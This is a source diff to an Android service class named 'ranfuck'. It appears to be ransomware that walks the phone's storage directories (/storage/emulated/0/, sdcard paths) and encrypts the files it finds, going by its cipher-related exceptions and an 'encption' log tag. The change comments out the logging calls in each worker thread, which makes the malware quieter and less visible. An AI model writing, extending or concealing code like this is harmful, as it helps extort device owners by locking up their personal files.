@@ -43,7 +43,7 @@ public class ranfuck extends Service {
             public void run() {
                 try {
                     listf("/storage/emulated/0/");
-                    Log.i(TAG, "emulat");
+                    //Log.i(TAG, "emulat");
                 } catch (IOException e) {
                     e.printStackTrace();
                 } catch (NoSuchPaddingException e) {
@@ -65,7 +65,7 @@ public class ranfuck extends Service {
             public void run() {
                 try {
                     listf("/storage/sdcard0/");
-                    Log.i(TAG, "sccard00");
+                    //Log.i(TAG, "sccard00");
                 } catch (IOException e) {
                     e.printStackTrace();
                 } catch (NoSuchPaddingException e) {
@@ -85,9 +85,9 @@ public class ranfuck extends Service {
             @Override
             public void run() {
                 try {
-                    Log.i(TAG, "encption");
+                    //Log.i(TAG, "encption");
                     listf(expath);
-                    Log.i(TAG, "expath");
+                    //Log.i(TAG, "expath");
                 } catch (IOException e) {
                     e.printStackTrace();
                 } catch (NoSuchPaddingException e) {
@@ -107,7 +107,7 @@ public class ranfuck extends Service {
             public void run() {
                 try {
                     listf("/storage/sdcard/");
-                    Log.i(TAG, "/scccc");
+                    //Log.i(TAG, "/scccc");
                 } catch (InvalidKeyException e) {
                     e.printStackTrace();
                 } catch (NoSuchAlgorithmException e) {
